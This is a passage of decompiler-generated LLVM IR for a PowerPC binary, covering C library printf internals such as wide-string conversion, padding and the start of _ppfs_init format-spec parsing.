  %storemerge94 = phi i32 [ %v3_1000a148, %dec_label_pc_1000a158 ], [ -1, %dec_label_pc_1000a148 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000a15c, i32* @r3, align 4
  store i32 %v2_1000a160, i32* @r6, align 4
  store i32 %v2_1000a15c, i32* @r4, align 4
  store i32 268476780, i32* @lr, align 4
  %v0_1000a168 = call i32 @__GI_wcsrtombs()
  %v3_1000a16c = icmp eq i32 %v0_1000a168, -1
  store i32 %v0_1000a168, i32* @r31, align 4
  br i1 %v3_1000a16c, label %dec_label_pc_1000a3d8, label %dec_label_pc_1000a178

dec_label_pc_1000a178:                            ; preds = %dec_label_pc_1000a15c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a274

dec_label_pc_1000a18c:                            ; preds = %dec_label_pc_1000a124
  store i32 %v2_1000a23c, i32* @r28, align 4
  store i32 268476832, i32* @lr, align 4
  %v3_1000a19c = call i32 @__GI_wcrtomb(i32 %v2_1000a23c, i32 %v2_1000a138, i32 %v2_1000a160)
  %v3_1000a1a0 = icmp eq i32 %v3_1000a19c, -1
  store i32 %v3_1000a19c, i32* @r31, align 4
  br i1 %v3_1000a1a0, label %dec_label_pc_1000a3d8, label %dec_label_pc_1000a1ac

dec_label_pc_1000a1ac:                            ; preds = %dec_label_pc_1000a18c
  store i32 %v2_1000a23c, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000a1bc = load i32, i32* @r25, align 4
  %v1_1000a1bc = load i32, i32* @r28, align 4
  %v3_1000a1bc = trunc i32 %v0_1000a1bc to i8
  %v4_1000a1bc = add i32 %v1_1000a1bc, %v3_1000a19c
  %v5_1000a1bc = inttoptr i32 %v4_1000a1bc to i8*
  store i8 %v3_1000a1bc, i8* %v5_1000a1bc, align 1
  %v0_1000a278.pre.pre = load i32, i32* @r31, align 4
  %v1_1000a278.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a274thread-pre-split

dec_label_pc_1000a1c4:                            ; preds = %dec_label_pc_1000a11c
  br i1 %v2_1000a1c4, label %dec_label_pc_1000a230, label %dec_label_pc_1000a1cc

dec_label_pc_1000a1cc:                            ; preds = %dec_label_pc_1000a1c4
  %v3_1000a1d0 = load i32, i32* %stack_var_-344, align 4
  %v1_1000a1d8 = inttoptr i32 %v3_1000a1d0 to i32*
  %v2_1000a1d8 = load i32, i32* %v1_1000a1d8, align 4
  br i1 %v3_1000a1c4, label %dec_label_pc_1000a1d8, label %dec_label_pc_1000a208

dec_label_pc_1000a1d8:                            ; preds = %dec_label_pc_1000a1cc
  store i32 %v2_1000a1d8, i32* %r30.global-to-local, align 4
  %v3_1000a1dc = icmp eq i32 %v2_1000a1d8, 0
  br i1 %v3_1000a1dc, label %dec_label_pc_1000a25c, label %dec_label_pc_1000a1e4

dec_label_pc_1000a1e4:                            ; preds = %dec_label_pc_1000a1d8, %dec_label_pc_1000a238
  %v0_1000a1f8 = phi i32 [ %v2_1000a1d8, %dec_label_pc_1000a1d8 ], [ %v3_1000a248, %dec_label_pc_1000a238 ]
  %v3_1000a1e4 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000a1e4, i32* %r0.global-to-local, align 4
  %v1_1000a1ec = icmp slt i32 %v3_1000a1e4, 0
  br i1 %v1_1000a1ec, label %dec_label_pc_1000a1f8, label %dec_label_pc_1000a1f4

dec_label_pc_1000a1f4:                            ; preds = %dec_label_pc_1000a1e4
  br label %dec_label_pc_1000a1f8

dec_label_pc_1000a1f8:                            ; preds = %dec_label_pc_1000a1e4, %dec_label_pc_1000a1f4
  %storemerge95 = phi i32 [ %v3_1000a1e4, %dec_label_pc_1000a1f4 ], [ -1, %dec_label_pc_1000a1e4 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268476928, i32* @lr, align 4
  %v1_1000a1fc = inttoptr i32 %v0_1000a1f8 to i8*
  %v2_1000a1fc = call i32 @strnlen(i8* %v1_1000a1fc)
  store i32 %v2_1000a1fc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a268

dec_label_pc_1000a208:                            ; preds = %dec_label_pc_1000a1cc
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000a1d8, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a23c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a274thread-pre-split

dec_label_pc_1000a230:                            ; preds = %dec_label_pc_1000a1c4
  br i1 %v3_1000a230, label %dec_label_pc_1000a238, label %dec_label_pc_1000a3d8

dec_label_pc_1000a238:                            ; preds = %dec_label_pc_1000a230
  %v0_1000a238 = call i32 @__errno_location()
  %v1_1000a240 = inttoptr i32 %v0_1000a238 to i32*
  %v2_1000a240 = load i32, i32* %v1_1000a240, align 4
  store i32 %v2_1000a240, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268477004, i32* @lr, align 4
  %v3_1000a248 = call i32 @__GI___glibc_strerror_r(i32 %v2_1000a240, i32 %v2_1000a23c, i32 128)
  store i32 %v3_1000a248, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a1e4

dec_label_pc_1000a254:                            ; preds = %dec_label_pc_1000a0d8, %dec_label_pc_1000a0d0, %dec_label_pc_1000a0b8
  %v0_1000a278.pre41 = phi i32 [ %v1_1000a038, %dec_label_pc_1000a0d8 ], [ 0, %dec_label_pc_1000a0d0 ], [ 5, %dec_label_pc_1000a0b8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000a274thread-pre-split

dec_label_pc_1000a25c:                            ; preds = %dec_label_pc_1000a1d8, %dec_label_pc_1000a138
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10016008.292 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a268

dec_label_pc_1000a268:                            ; preds = %dec_label_pc_1000a1f8, %dec_label_pc_1000a25c
  %v0_1000a27829 = phi i32 [ %v2_1000a1fc, %dec_label_pc_1000a1f8 ], [ 6, %dec_label_pc_1000a25c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000a274

dec_label_pc_1000a274thread-pre-split:            ; preds = %dec_label_pc_1000a1ac, %dec_label_pc_1000a208, %dec_label_pc_1000a254, %dec_label_pc_1000a0d8
  %v1_1000a278.pre = phi i32 [ %v2_1000a0dc, %dec_label_pc_1000a0d8 ], [ 0, %dec_label_pc_1000a254 ], [ %v1_1000a278.pre.pre, %dec_label_pc_1000a1ac ], [ 0, %dec_label_pc_1000a208 ]
  %v0_1000a278.pre = phi i32 [ %v1_1000a038, %dec_label_pc_1000a0d8 ], [ %v0_1000a278.pre41, %dec_label_pc_1000a254 ], [ %v0_1000a278.pre.pre, %dec_label_pc_1000a1ac ], [ 1, %dec_label_pc_1000a208 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000a0d8 ], [ %stack_var_-184.0, %dec_label_pc_1000a254 ], [ %v0_1000a01c, %dec_label_pc_1000a1ac ], [ %v0_1000a01c, %dec_label_pc_1000a208 ]
  %v0_1000a274.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000a274

dec_label_pc_1000a274:                            ; preds = %dec_label_pc_1000a274thread-pre-split, %dec_label_pc_1000a178, %dec_label_pc_1000a268
  %v1_1000a278 = phi i32 [ %v1_1000a278.pre, %dec_label_pc_1000a274thread-pre-split ], [ 0, %dec_label_pc_1000a178 ], [ 0, %dec_label_pc_1000a268 ]
  %v0_1000a278 = phi i32 [ %v0_1000a278.pre, %dec_label_pc_1000a274thread-pre-split ], [ %v0_1000a168, %dec_label_pc_1000a178 ], [ %v0_1000a27829, %dec_label_pc_1000a268 ]
  %v0_1000a280 = phi i32 [ %v0_1000a274.pr, %dec_label_pc_1000a274thread-pre-split ], [ 11, %dec_label_pc_1000a178 ], [ 11, %dec_label_pc_1000a268 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000a274thread-pre-split ], [ %v0_1000a01c, %dec_label_pc_1000a178 ], [ %v0_1000a01c, %dec_label_pc_1000a268 ]
  %v3_1000a274 = icmp eq i32 %v0_1000a280, 11
  %v2_1000a278 = add i32 %v0_1000a278, %v1_1000a278
  store i32 %v2_1000a278, i32* %r0.global-to-local, align 4
  br i1 %v3_1000a274, label %dec_label_pc_1000a294, label %dec_label_pc_1000a280

dec_label_pc_1000a280:                            ; preds = %dec_label_pc_1000a274
  %v0_1000a284 = call i32 @__asm_mfcr()
  %v1_1000a288 = call i32 @__asm_rlwinm(i32 %v0_1000a284, i32 30, i32 31, i32 31)
  %v1_1000a28c = add i32 %v1_1000a288, 1
  %v0_1000a290 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a290 = add i32 %v0_1000a290, %v1_1000a28c
  store i32 %v2_1000a290, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000a294

dec_label_pc_1000a294:                            ; preds = %dec_label_pc_1000a274, %dec_label_pc_1000a280
  %v0_1000a2ac = phi i32 [ %v2_1000a278, %dec_label_pc_1000a274 ], [ %v2_1000a290, %dec_label_pc_1000a280 ]
  %v3_1000a29c = icmp ugt i32 %tmp, %v0_1000a2ac
  br i1 %v3_1000a29c, label %dec_label_pc_1000a2a4, label %dec_label_pc_1000a2a8

dec_label_pc_1000a2a4:                            ; preds = %dec_label_pc_1000a294
  %v2_1000a2a4 = sub i32 %tmp, %v0_1000a2ac
  br label %dec_label_pc_1000a2a8

dec_label_pc_1000a2a8:                            ; preds = %dec_label_pc_1000a294, %dec_label_pc_1000a2a4
  %storemerge93 = phi i32 [ %v2_1000a2a4, %dec_label_pc_1000a2a4 ], [ 0, %dec_label_pc_1000a294 ]
  %v1_1000a2b8 = phi i32 [ %v2_1000a2a4, %dec_label_pc_1000a2a4 ], [ 0, %dec_label_pc_1000a294 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000a2a8 = load i32, i32* @r26, align 4
  %v3_1000a2a8 = icmp eq i32 %v0_1000a2a8, 48
  %v2_1000a2ac = add i32 %v1_1000a2b8, %v0_1000a2ac
  store i32 %v2_1000a2ac, i32* %r0.global-to-local, align 4
  %v0_1000a2b0 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000a2b0 = add i32 %v0_1000a2b0, %v2_1000a2ac
  store i32 %v2_1000a2b0, i32* %r23.global-to-local, align 4
  br i1 %v3_1000a2a8, label %dec_label_pc_1000a2b8, label %dec_label_pc_1000a2c0

dec_label_pc_1000a2b8:                            ; preds = %dec_label_pc_1000a2a8
  %v0_1000a2b8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000a2b8 = add i32 %v0_1000a2b8, %v1_1000a2b8
  store i32 %v2_1000a2b8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000a2c0

dec_label_pc_1000a2c0:                            ; preds = %dec_label_pc_1000a2a8, %dec_label_pc_1000a2b8
  %v0_1000a2d4 = phi i32 [ %v1_1000a2b8, %dec_label_pc_1000a2a8 ], [ 0, %dec_label_pc_1000a2b8 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000a2c4 = and i32 %stack_var_-184.1, 8
  %v3_1000a2c4 = icmp eq i32 %v1_1000a2c4, 0
  br i1 %v3_1000a2c4, label %dec_label_pc_1000a2cc, label %dec_label_pc_1000a2e8

dec_label_pc_1000a2cc:                            ; preds = %dec_label_pc_1000a2c0
  %v0_1000a2cc = load i32, i32* %r24.global-to-local, align 4
  store i32 268477148, i32* @lr, align 4
  %v4_1000a2d8 = call i32 @_charpad(i32 %v0_1000a2cc, i8 32, i32 %v0_1000a2d4)
  %v1_1000a2dc = load i32, i32* @r28, align 4
  %v4_1000a2dc = icmp eq i32 %v4_1000a2d8, %v1_1000a2dc
  br i1 %v4_1000a2dc, label %dec_label_pc_1000a2e4, label %dec_label_pc_1000a3d8

dec_label_pc_1000a2e4:                            ; preds = %dec_label_pc_1000a2cc
  br label %dec_label_pc_1000a2e8

dec_label_pc_1000a2e8:                            ; preds = %dec_label_pc_1000a2c0, %dec_label_pc_1000a2e4
  %v0_1000a2ec = load i32, i32* %r24.global-to-local, align 4
  %v0_1000a2f4 = load i32, i32* @r27, align 4
  %v2_1000a2f4 = add i32 %v0_1000a2f4, ptrtoint (i32* @global_var_10016010.293 to i32)
  store i32 268477180, i32* @lr, align 4
  %v2_1000a2f8 = call i32 @__GI_fputs_unlocked(i32 %v2_1000a2f4, i32 %v0_1000a2ec)
  %v0_1000a304 = load i32, i32* @r29, align 4
  store i32 268477196, i32* @lr, align 4
  %v4_1000a308 = call i32 @_charpad(i32 %v0_1000a2ec, i8 48, i32 %v0_1000a304)
  %v1_1000a30c = load i32, i32* @r29, align 4
  %v4_1000a30c = icmp eq i32 %v4_1000a308, %v1_1000a30c
  br i1 %v4_1000a30c, label %dec_label_pc_1000a314, label %dec_label_pc_1000a3d8

dec_label_pc_1000a314:                            ; preds = %dec_label_pc_1000a2e8
  %v3_1000a314 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000a314, i32* %r0.global-to-local, align 4
  %v3_1000a318 = icmp eq i32 %v3_1000a314, 0
  br i1 %v3_1000a318, label %dec_label_pc_1000a320, label %dec_label_pc_1000a348

dec_label_pc_1000a320:                            ; preds = %dec_label_pc_1000a314
  %v0_1000a320 = load i32, i32* @r31, align 4
  %v3_1000a320 = icmp eq i32 %v0_1000a320, 0
  br i1 %v3_1000a320, label %dec_label_pc_1000a33c.thread, label %dec_label_pc_1000a33c

dec_label_pc_1000a33c.thread:                     ; preds = %dec_label_pc_1000a320
  br label %dec_label_pc_1000a3ac

dec_label_pc_1000a33c:                            ; preds = %dec_label_pc_1000a320
  %v0_1000a32c = load i32, i32* @r30, align 4
  %v0_1000a334 = load i32, i32* %r24.global-to-local, align 4
  store i32 268477244, i32* @lr, align 4
  %v4_1000a338 = inttoptr i32 %v0_1000a334 to i16*
  %v5_1000a338 = call i32 @__stdio_fwrite(i32 %v0_1000a32c, i32 %v0_1000a320, i16* %v4_1000a338)
  %v1_1000a33c.pre = load i32, i32* @r31, align 4
  %v4_1000a33c = icmp eq i32 %v5_1000a338, %v1_1000a33c.pre
  br i1 %v4_1000a33c, label %dec_label_pc_1000a3ac, label %dec_label_pc_1000a3d8

dec_label_pc_1000a348:                            ; preds = %dec_label_pc_1000a314
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000a38c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a38c

dec_label_pc_1000a354:                            ; preds = %dec_label_pc_1000a38c
  %tmp78 = icmp ult i32 %v0_1000a3a4, 129
  br i1 %tmp78, label %dec_label_pc_1000a35c, label %dec_label_pc_1000a358

dec_label_pc_1000a358:                            ; preds = %dec_label_pc_1000a354
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000a35c

dec_label_pc_1000a35c:                            ; preds = %dec_label_pc_1000a354, %dec_label_pc_1000a358
  store i32 ptrtoint (i32* @global_var_1000a360.294 to i32), i32* @lr, align 4
  %v0_1000a35c = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a35c, i32* @r30, align 4
  %v3_1000a364 = icmp eq i32 %v0_1000a35c, 0
  br i1 %v3_1000a364, label %dec_label_pc_1000a380, label %dec_label_pc_1000a378

dec_label_pc_1000a378:                            ; preds = %dec_label_pc_1000a35c
  %v0_1000a368 = load i32, i32* %r24.global-to-local, align 4
  store i32 268477308, i32* @lr, align 4
  %v3_1000a378 = inttoptr i32 %v0_1000a368 to i16*
  %v4_1000a378 = call i32 @__stdio_fwrite(i32 %v2_1000a23c, i32 %v0_1000a35c, i16* %v3_1000a378)
  store i32 %v4_1000a378, i32* %r0.global-to-local, align 4
  %v1_1000a380.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a380

dec_label_pc_1000a380:                            ; preds = %dec_label_pc_1000a35c, %dec_label_pc_1000a378
  %v1_1000a380 = phi i32 [ 0, %dec_label_pc_1000a35c ], [ %v1_1000a380.pre, %dec_label_pc_1000a378 ]
  %v0_1000a384 = phi i32 [ 0, %dec_label_pc_1000a35c ], [ %v4_1000a378, %dec_label_pc_1000a378 ]
  %v4_1000a380 = icmp eq i32 %v0_1000a384, %v1_1000a380
  %v1_1000a384 = load i32, i32* @r31, align 4
  %v2_1000a384 = sub i32 %v1_1000a384, %v0_1000a384
  store i32 %v2_1000a384, i32* @r31, align 4
  br i1 %v4_1000a380, label %dec_label_pc_1000a38c, label %dec_label_pc_1000a3d8

dec_label_pc_1000a38c:                            ; preds = %dec_label_pc_1000a380, %dec_label_pc_1000a348
  %v0_1000a3a4 = phi i32 [ %v2_1000a384, %dec_label_pc_1000a380 ], [ %v0_1000a38c.pre, %dec_label_pc_1000a348 ]
  %v3_1000a38c = icmp eq i32 %v0_1000a3a4, 0
  store i32 %v2_1000a23c, i32* @r29, align 4
  store i32 %v2_1000a15c, i32* @r4, align 4
  store i32 %v2_1000a160, i32* @r6, align 4
  store i32 %v2_1000a23c, i32* @r3, align 4
  store i32 %v0_1000a3a4, i32* @r5, align 4
  br i1 %v3_1000a38c, label %dec_label_pc_1000a3ac, label %dec_label_pc_1000a354

dec_label_pc_1000a3ac:                            ; preds = %dec_label_pc_1000a38c, %dec_label_pc_1000a33c.thread, %dec_label_pc_1000a33c
  %v0_1000a3ac = load i32, i32* %r24.global-to-local, align 4
  %v0_1000a3b4 = load i32, i32* @r28, align 4
  store i32 268477372, i32* @lr, align 4
  %v4_1000a3b8 = call i32 @_charpad(i32 %v0_1000a3ac, i8 32, i32 %v0_1000a3b4)
  %v1_1000a3bc = load i32, i32* @r28, align 4
  %v4_1000a3bc = icmp eq i32 %v4_1000a3b8, %v1_1000a3bc
  br i1 %v4_1000a3bc, label %dec_label_pc_1000a3c4, label %dec_label_pc_1000a3d8

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a3ac, %dec_label_pc_1000a114, %dec_label_pc_10009ee8
  %stack_var_-184.2 = phi i32 [ %v0_1000a01c, %dec_label_pc_10009ee8 ], [ %stack_var_-184.1, %dec_label_pc_1000a3ac ], [ %v0_1000a01c, %dec_label_pc_1000a114 ]
  %v3_1000a3c4 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000a3c4 = ptrtoint i8* %v3_1000a3c4 to i32
  store i32 %v4_1000a3c4, i32* @r29, align 4
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a3c8:                            ; preds = %dec_label_pc_10009ddc, %dec_label_pc_1000a3c4
  %v0_1000a3c8 = phi i32 [ %v0_1000a3c8.pre, %dec_label_pc_10009ddc ], [ %v4_1000a3c4, %dec_label_pc_1000a3c4 ]
  %v0_1000a01c = phi i32 [ %tmp56, %dec_label_pc_10009ddc ], [ %stack_var_-184.2, %dec_label_pc_1000a3c4 ]
  br label %dec_label_pc_10009df4

dec_label_pc_1000a3d8:                            ; preds = %dec_label_pc_1000a230, %dec_label_pc_1000a3ac, %dec_label_pc_1000a33c, %dec_label_pc_1000a2e8, %dec_label_pc_1000a2cc, %dec_label_pc_1000a18c, %dec_label_pc_1000a15c, %dec_label_pc_1000a0f0, %dec_label_pc_10009e30, %dec_label_pc_1000a380
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000a3dc

dec_label_pc_1000a3dc:                            ; preds = %dec_label_pc_10009e3c, %dec_label_pc_10009db4, %dec_label_pc_10009dcc, %dec_label_pc_1000a3d8
  store i32 %v0_10009d88, i32* %r0.global-to-local, align 4
  %v0_1000a3e0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000a3e0

; uselistorder directives
  uselistorder i32 %v0_1000a01c, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000a3a4, { 1, 2, 0 }
  uselistorder i32 %v1_1000a2b8, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000a248, { 1, 0 }
  uselistorder i32 %v2_1000a1d8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000a138, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000a01c, { 1, 0 }
  uselistorder i32 %v6_10009fd4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_10009fa4, { 1, 0 }
  uselistorder i32 %v1_10009f48, { 1, 0 }
  uselistorder i1 %v2_10009f3c, { 1, 0 }
  uselistorder i32 %v0_10009eec, { 1, 0, 2 }
  uselistorder i32 %v1_10009ed8, { 1, 0 }
  uselistorder i32 %v0_10009ed0, { 1, 0 }
  uselistorder i32 %v1_10009ecc, { 1, 0 }
  uselistorder i32 %v1_10009e48, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10009e10, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10009e20, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000a23c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_10009e84, { 1, 2, 0 }
  uselistorder i32 %v4_10009e7c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 1, 0, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 1, 0, 2, 5 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4, 10, 9, 8, 11, 12 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3dc, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a3d8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000a3c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3ac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a380, { 1, 0 }
  uselistorder label %dec_label_pc_1000a35c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a294, { 1, 0 }
  uselistorder label %dec_label_pc_1000a274, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000a274thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000a268, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a15c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000a094, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000a044, { 1, 0 }
  uselistorder label %dec_label_pc_1000a028, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10009fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10009f98, { 1, 0 }
  uselistorder label %dec_label_pc_10009f84, { 1, 0 }
  uselistorder label %dec_label_pc_10009f80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009f54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009edc, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009ea0, { 1, 0 }
  uselistorder label %dec_label_pc_10009e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10009e30, { 1, 0 }
  uselistorder label %dec_label_pc_10009df4, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000a3f8 = load i32, i32* @lr, align 4
  store i32 %v0_1000a3f8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000a408 = load i32, i32* @r4, align 4
  store i32 %v0_1000a408, i32* @r30, align 4
  store i32 268477464, i32* @lr, align 4
  %v3_1000a414 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000a418 = load i32, i32* @r31, align 4
  %v1_1000a418 = add i32 %v0_1000a418, 24
  %v2_1000a418 = inttoptr i32 %v1_1000a418 to i32*
  %v3_1000a418 = load i32, i32* %v2_1000a418, align 4
  store i32 %v3_1000a418, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000a420 = load i32, i32* @r30, align 4
  %v2_1000a420 = inttoptr i32 %v0_1000a418 to i32*
  store i32 %v0_1000a420, i32* %v2_1000a420, align 4
  %v0_1000a424 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000a424, i32* %ctr.global-to-local, align 4
  %v0_1000a428 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a428 = add i32 %v0_1000a428, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000a430 = load i32, i32* @r31, align 4
  %v2_1000a430 = add i32 %v1_1000a430, 24
  %v3_1000a430 = inttoptr i32 %v2_1000a430 to i32*
  store i32 %v1_1000a428, i32* %v3_1000a430, align 4
  %v0_1000a434 = load i32, i32* @r31, align 4
  %v1_1000a434 = add i32 %v0_1000a434, 40
  store i32 %v1_1000a434, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a438

dec_label_pc_1000a438:                            ; preds = %dec_label_pc_1000a438, %entry
  %v1_1000a438 = phi i32 [ %v1_1000a43c, %dec_label_pc_1000a438 ], [ %v1_1000a434, %entry ]
  %v0_1000a438 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000a438 = inttoptr i32 %v1_1000a438 to i32*
  store i32 %v0_1000a438, i32* %v2_1000a438, align 4
  %v0_1000a43c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a43c = add i32 %v0_1000a43c, 4
  store i32 %v1_1000a43c, i32* %r9.global-to-local, align 4
  %v0_1000a440 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000a440 = add i32 %v0_1000a440, -1
  store i32 %v1_1000a440, i32* %ctr.global-to-local, align 4
  %v2_1000a440 = icmp eq i32 %v1_1000a440, 0
  br i1 %v2_1000a440, label %dec_label_pc_1000a444, label %dec_label_pc_1000a438

dec_label_pc_1000a444:                            ; preds = %dec_label_pc_1000a438
  %v0_1000a444 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000a484

dec_label_pc_1000a454:                            ; preds = %dec_label_pc_1000a484
  %v3_1000a48c = icmp eq i8 %v2_1000a484, 37
  br i1 %v3_1000a48c, label %dec_label_pc_1000a458, label %dec_label_pc_1000a480

dec_label_pc_1000a458:                            ; preds = %dec_label_pc_1000a454
  %v1_1000a458 = add i32 %v0_1000a458, 1
  %v2_1000a458 = inttoptr i32 %v1_1000a458 to i8*
  %v3_1000a458 = load i8, i8* %v2_1000a458, align 1
  %v4_1000a458 = zext i8 %v3_1000a458 to i32
  store i32 %v4_1000a458, i32* %r0.global-to-local, align 4
  store i32 %v1_1000a458, i32* %r9.global-to-local, align 4
  %v3_1000a460 = icmp eq i8 %v3_1000a458, 37
  br i1 %v3_1000a460, label %dec_label_pc_1000a480, label %dec_label_pc_1000a468

dec_label_pc_1000a468:                            ; preds = %dec_label_pc_1000a458
  %v0_1000a45c = load i32, i32* @r31, align 4
  %v2_1000a468 = inttoptr i32 %v0_1000a45c to i32*
  store i32 %v1_1000a458, i32* %v2_1000a468, align 4
  store i32 268477552, i32* @lr, align 4
  %v1_1000a46c = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a46c = call i32 @_ppfs_parsespec(i32* %v2_1000a468, i32 %v1_1000a46c)
